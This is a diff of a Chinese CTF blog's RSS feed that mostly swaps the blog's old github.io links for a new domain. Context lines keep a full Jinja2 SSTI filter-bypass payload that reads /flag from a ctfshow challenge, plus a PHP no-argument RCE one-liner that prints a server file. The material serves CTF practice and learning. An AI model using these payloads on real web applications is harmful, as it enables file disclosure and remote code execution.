@@ -2,23 +2,23 @@
 <rss version="2.0">
     <channel>
         <title>golden的部落阁 • Posts by &#34;web狗的自我安慰&#34; category</title>
-        <link>http://g01den1.github.io</link>
+        <link>http://blog.g01den.top</link>
         <description>golden的部落阁</description>
         <language>zh-CN</language>
         <pubDate>Tue, 03 Feb 2026 22:25:29 +0800</pubDate>
         <lastBuildDate>Tue, 03 Feb 2026 22:25:29 +0800</lastBuildDate>
+        <category>Game</category>
+        <category>Daily life</category>
         <category>CVE</category>
         <category>Web</category>
-        <category>Daily life</category>
-        <category>Java</category>
-        <category>Game</category>
-        <category>408</category>
         <category>Misc</category>
+        <category>Java</category>
+        <category>408</category>
         <category>Pwn</category>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/2d792864.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/2d792864.html</guid>
             <title>Python栈帧逃逸</title>
-            <link>http://g01den1.github.io/posts/2d792864.html</link>
+            <link>http://blog.g01den.top/posts/2d792864.html</link>
             <category>Web</category>
             <pubDate>Tue, 03 Feb 2026 22:25:29 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;python栈帧逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python栈帧逃逸&#34;&gt;#&lt;/a&gt; Python 栈帧逃逸：&lt;/h1&gt;
@@ -77,9 +77,9 @@
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/ff5b88d5.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/ff5b88d5.html</guid>
             <title>python原型链污染</title>
-            <link>http://g01den1.github.io/posts/ff5b88d5.html</link>
+            <link>http://blog.g01den.top/posts/ff5b88d5.html</link>
             <category>Web</category>
             <pubDate>Mon, 02 Feb 2026 04:48:16 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;python原型链污染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python原型链污染&#34;&gt;#&lt;/a&gt; python 原型链污染&lt;/h1&gt;
@@ -440,9 +440,9 @@ return cookies
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/b3ad4123.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/b3ad4123.html</guid>
             <title>有小考点的Web题</title>
-            <link>http://g01den1.github.io/posts/b3ad4123.html</link>
+            <link>http://blog.g01den.top/posts/b3ad4123.html</link>
             <category>Web</category>
             <pubDate>Mon, 27 Oct 2025 22:38:34 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;buuoj-npuctf2020ezinclude-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#buuoj-npuctf2020ezinclude-1&#34;&gt;#&lt;/a&gt; BUUOJ-[NPUCTF2020]ezinclude 1&lt;/h1&gt;
@@ -566,9 +566,9 @@ return cookies
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/4826d2ce.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/4826d2ce.html</guid>
             <title>ctfshow-SSTI</title>
-            <link>http://g01den1.github.io/posts/4826d2ce.html</link>
+            <link>http://blog.g01den.top/posts/4826d2ce.html</link>
             <category>Web</category>
             <pubDate>Sat, 03 May 2025 23:19:26 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;web361&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web361&#34;&gt;#&lt;/a&gt; web361：&lt;/h1&gt;
@@ -641,9 +641,9 @@ return cookies
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?name=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; po=&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(po=a,p=a)|join%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; a=(()|select|string|&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;)|attr(po)(２４)%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; ini=(a,a,&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(init=a)|join,a,a)|join()%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; glo=(a,a,&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;globals&lt;/span&gt;=a)|join,a,a)|join()%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; geti=(a,a,&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(getitem=a)|join,a,a)|join()%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; built=(a,a,&lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(builtins=a)|join,a,a)|join()%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;=x.&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; file=&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;%&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(x.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(file).read())%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/ad175165.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/ad175165.html</guid>
             <title>ctfshow-文件包含</title>
-            <link>http://g01den1.github.io/posts/ad175165.html</link>
+            <link>http://blog.g01den.top/posts/ad175165.html</link>
             <category>Web</category>
             <pubDate>Sun, 24 Nov 2024 21:38:01 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;竞争包含先不写了，有时间再写。&lt;/p&gt;
@@ -683,9 +683,9 @@ return cookies
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/b856856d.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/b856856d.html</guid>
             <title>ctfshow-ssrf</title>
-            <link>http://g01den1.github.io/posts/b856856d.html</link>
+            <link>http://blog.g01den.top/posts/b856856d.html</link>
             <category>Web</category>
             <pubDate>Thu, 26 Sep 2024 19:09:50 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;web351&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web351&#34;&gt;#&lt;/a&gt; web351：&lt;/h1&gt;
@@ -748,9 +748,9 @@ return cookies
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/4fb535d6.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/4fb535d6.html</guid>
             <title>ctfshow-反序列化</title>
-            <link>http://g01den1.github.io/posts/4fb535d6.html</link>
+            <link>http://blog.g01den.top/posts/4fb535d6.html</link>
             <category>Web</category>
             <pubDate>Tue, 17 Sep 2024 20:19:47 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;一些基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些基础&#34;&gt;#&lt;/a&gt; 一些基础：&lt;/h1&gt;
@@ -927,9 +927,9 @@ __invoke () // 当尝试以调用函数的方式调用一个对象时&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/53e2b2e1.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/53e2b2e1.html</guid>
             <title>ctfshow-命令执行</title>
-            <link>http://g01den1.github.io/posts/53e2b2e1.html</link>
+            <link>http://blog.g01den.top/posts/53e2b2e1.html</link>
             <category>Web</category>
             <pubDate>Mon, 16 Sep 2024 21:04:45 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;web29&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web29&#34;&gt;#&lt;/a&gt; Web29：&lt;/h1&gt;
@@ -1276,9 +1276,9 @@ c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/97a7dff3.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/97a7dff3.html</guid>
             <title>ctfshow-信息搜集</title>
-            <link>http://g01den1.github.io/posts/97a7dff3.html</link>
+            <link>http://blog.g01den.top/posts/97a7dff3.html</link>
             <category>Web</category>
             <pubDate>Sat, 14 Sep 2024 16:55:17 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;web1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web1&#34;&gt;#&lt;/a&gt; Web1：&lt;/h1&gt;
@@ -1381,9 +1381,9 @@ Disallow 记录为空，则表示网站所有页面都允许被抓取；&lt;br&g
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/2f610211.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/2f610211.html</guid>
             <title>反弹shell</title>
-            <link>http://g01den1.github.io/posts/2f610211.html</link>
+            <link>http://blog.g01den.top/posts/2f610211.html</link>
             <category>Web</category>
             <pubDate>Tue, 18 Jun 2024 19:57:36 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell：&lt;/h1&gt;
@@ -1464,9 +1464,9 @@ Disallow 记录为空，则表示网站所有页面都允许被抓取；&lt;br&g
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/88915f6f.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/88915f6f.html</guid>
             <title>无参数RCE的一些奇技淫巧</title>
-            <link>http://g01den1.github.io/posts/88915f6f.html</link>
+            <link>http://blog.g01den.top/posts/88915f6f.html</link>
             <category>Web</category>
             <pubDate>Sat, 06 Apr 2024 19:06:19 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;简述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#简述&#34;&gt;#&lt;/a&gt; 简述：&lt;/h1&gt;
@@ -1588,9 +1588,9 @@ Disallow 记录为空，则表示网站所有页面都允许被抓取；&lt;br&g
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://g01den1.github.io/posts/384200ef.html</guid>
+            <guid isPermalink="true">http://blog.g01den.top/posts/384200ef.html</guid>
             <title>SQL无列名注入</title>
-            <link>http://g01den1.github.io/posts/384200ef.html</link>
+            <link>http://blog.g01den.top/posts/384200ef.html</link>
             <category>Web</category>
             <pubDate>Sun, 03 Mar 2024 19:10:34 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;sql无列名注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql无列名注入&#34;&gt;#&lt;/a&gt; SQL 无列名注入&lt;/h1&gt;
